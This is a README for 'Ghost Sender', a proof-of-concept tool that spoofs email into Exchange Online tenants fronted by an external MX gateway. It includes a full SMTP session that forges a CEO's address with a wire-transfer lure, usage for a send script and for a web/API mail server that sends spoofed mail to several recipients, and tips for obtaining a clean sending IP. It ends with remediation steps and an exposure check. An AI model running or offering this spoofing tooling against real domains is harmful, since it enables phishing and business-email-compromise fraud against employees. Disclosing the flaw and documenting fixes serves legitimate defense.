# Ghost Sender — Exchange Online Email Spoofing PoC

Proof-of-concept for the **Ghost Sender** vulnerability affecting Exchange Online tenants that use an external MX record without a partner connector or transport rule.

When exploited, an attacker delivers spoofed emails directly to any user's inbox — bypassing SPF, DKIM, and DMARC with no external warning banner.

## Background

- **InfoGuard Labs Disclosure:** https://labs.infoguard.ch/posts/ghost-sender/
- **Microsoft Guidance:** https://techcommunity.microsoft.com/blog/exchange/direct-send-vs-sending-directly-to-an-exchange-online-tenant/4439865

---

## The Vulnerability

When an organization uses Exchange Online behind a third-party email gateway (external MX record) **without** a partner connector or transport rule:

```
                        NORMAL PATH (Legitimate)
                        ========================
    Legitimate ──────> MX Gateway ──────> Exchange Online ──────> Inbox
    Sender            (Filtered)          (Trusted)              [OK] Delivered


                        ATTACK PATH (Ghost Sender)
                        =========================
    Attacker ──────> Exchange Online ──────> Inbox
    (clean IP)       (Direct TCP:25)         [OK] Delivered
                     (Bypasses MX!)          [X] No SPF check
                                             [X] No DKIM check
                                             [X] No DMARC check
                                             [X] No warning banner
```

**Why:** Exchange Online, when fronted by an external MX, treats ALL inbound mail as "already filtered" and does NOT perform its own SPF/DKIM/DMARC enforcement. The attacker opens a TCP connection directly to `domain-com.mail.protection.outlook.com:25` and delivers email as if it came through the trusted gateway path.

### What Gets Bypassed

| Mechanism | Configuration | Result |
|-----------|--------------|--------|
| **SPF** | `-all` (hard fail) | **Ignored** — no check performed |
| **DKIM** | Signed by Microsoft | **Ignored** — no signature required |
| **DMARC** | `p=reject; aspf=s; adkim=s` | **Ignored** — not evaluated |
| **External Banner** | Gateway warning | **Not shown** — appears internal |
| **Sender Avatar** | Profile photo | **Resolved** — for internal senders |

### SMTP Conversation (Proof)

```
$ openssl s_client -connect domain-com.mail.protection.outlook.com:25 -starttls smtp

<-- 220 Microsoft ESMTP MAIL Service ready
--> EHLO x
<-- 250-STARTTLS
--> STARTTLS
<-- 220 Ready (TLS established)
--> EHLO x
<-- 250 PIPELINING
--> MAIL FROM:<ceo@domain.com>
<-- 250 2.1.0 Sender OK
--> RCPT TO:<employee@domain.com>
<-- 250 2.1.5 Recipient OK
--> DATA
<-- 354 Start mail input
--> From: CEO <ceo@domain.com>
--> To: employee@domain.com
--> Subject: Urgent Wire Transfer
-->
--> Please process immediately.
--> .
<-- 250 2.6.0 Queued mail for delivery [InternalId=...]

Email delivered. No SPF check. No DKIM check. No DMARC check.
```

### Vulnerable vs Secure

```
VULNERABLE                                    SECURE
==========                                    ======
MX: external-gateway.com                      MX: domain-com.mail.protection.outlook.com
Connector: NONE                               Connector: Partner (IP restricted)
                                               or Transport Rule (priority 0)

Attacker --> :25 --> M365 --> Inbox [OK]      Attacker --> :25 --> M365 --> Rejected [X]
Legit --> MX --> M365 --> Inbox [OK]          Legit --> MX --> M365 --> Inbox [OK]
```

---

## Quick Start

### One-Liner

```bash
./send.sh target-domain.com sender@domain.com victim@domain.com "Subject" "Body"
```

### Mail Server

```bash
python3 mail-server.py
# Web UI at http://localhost:8080
# To, Cc, multi-recipient, JSON API
```

**API:**
```bash
curl -X POST http://localhost:8080/send \
  -d "from=ceo@domain.com" \
  -d "to=employee@domain.com,hr@domain.com" \
  -d "cc=legal@domain.com" \
  -d "subject=Urgent" \
  -d "body=Message"
```

```json
{"success":true,"message":"Sent 3/3","results":[...]}
```

---

## Requirements

- Python 3.6+ (stdlib only)
- Outbound TCP port 25 (AWS EC2: yes, Oracle: blocked, Residential: usually blocked)
- Clean IP (not on Spamhaus — request removal at https://check.spamhaus.org)

---

## Fix

In Exchange Admin Center, implement **one**:

### Option 1: Partner Organization Connector (Recommended)

```
Exchange Admin Center > Mail Flow > Connectors > Add
  From: Partner organization
  Identify by: Sender's IP address
  IP ranges: [Your MX gateway IPs]
  Security: Reject email not sent from these IPs
```

### Option 2: Transport Rule (Priority 0)

```
Exchange Admin Center > Mail Flow > Rules > New
  Apply if: Sender is outside the organization
  AND: Sender IP NOT in [Your MX gateway IPs]
  Do: Reject (5.7.1)
  Priority: 0
```

### Option 3: Point MX to Exchange Online

```
Remove external MX. Point to: domain-com.mail.protection.outlook.com
```

---

## Check Your Domain

```bash
# Is your MX external?
dig +short MX your-domain.com

# If it's NOT domain-com.mail.protection.outlook.com:
#   You may be vulnerable. Run this PoC to verify.

# Can M365 EOP be reached directly?
echo "QUIT" | openssl s_client -connect \
  $(echo your-domain.com | tr '.' '-').mail.protection.outlook.com:25 \
  -starttls smtp -crlf -quiet 2>/dev/null | head -1
# If "220 ... Microsoft ESMTP" appears -> M365 EOP is directly reachable
```

---

## Files

| File | Purpose |
|------|---------|
| `send.sh` | One-liner PoC |
| `mail-server.py` | Mail server with web UI, CC, multi-recipient, JSON API |
| `LICENSE` | MIT |

## Authorized Use Only

Test only your own infrastructure or domains you have written authorization for.
